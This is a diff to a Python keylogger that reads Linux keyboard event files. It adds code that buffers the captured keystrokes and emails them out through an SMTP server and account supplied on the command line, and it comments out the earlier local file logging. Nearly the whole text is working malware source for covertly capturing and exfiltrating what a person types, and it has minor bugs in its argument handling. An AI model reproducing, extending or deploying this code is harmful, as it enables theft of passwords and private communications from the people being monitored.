@@ -1,3 +1,6 @@
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 import re
 import struct
 import sys
@@ -126,14 +129,56 @@ def main():
         if keyPressedCode != 0 and eventType == 1 and value == 1:
             if keyPressedCode in QWERTY_MAP:
                 typedData += QWERTY_MAP[keyPressedCode]
-        with open("/keyboardOutput.txt", "a") as o:
-            o.write(typedData)
-        # print(typedData, end="")
-        # sendEmail(typedData)
-        typedData = ""
+        # with open("/keyboardOutput.txt", "a") as o:
+        #     o.write(typedData)
+        if len(typedData) > BUF_SIZE:
+            sendEmail(typedData)
+            typedData = ""
         event = keyboardEventFile.read(EVENT_SIZE)
     keyboardEventFile.close()
 
 
+def printUsage():
+    print(
+        "Usage: ./keylogger [your email] [your password] [smtp server] [buffer_size]")
+
+
+def init_arg():
+    if len(sys.argv) < 4:
+        printUsage()
+        exit()
+    global EMAIL
+    global SERVER
+    global BUF_SIZE
+    global PASS
+    EMAIL = sys.argv[1]
+    PASS = sys.argv[2]
+    SERVER = sys.argv[3]
+    BUF_SIZE = int(sys.argv[4])
+
+
+def sendEmail(message):
+    msg = MIMEMultipart()
+    password = PASS
+    msg['From'] = EMAIL
+    msg['To'] = EMAIL
+    msg['Subject'] = EMAIL
+    msg.attach(MIMEText(message, 'plain'))
+    server = smtplib.SMTP(SERVER)
+    server.ehlo()
+    server.starttls()
+    server.ehlo()
+    server.login(msg['From'], password)
+    server.sendmail(msg['From'], msg['To'], msg.as_string())
+    server.quit()
+
+
+USE_TLS = None
+SERVER = None
+MAIL = None
+BUF_SIZE = None
+PASS = None
+
 if __name__ == "__main__":
+    init_arg()
     main()
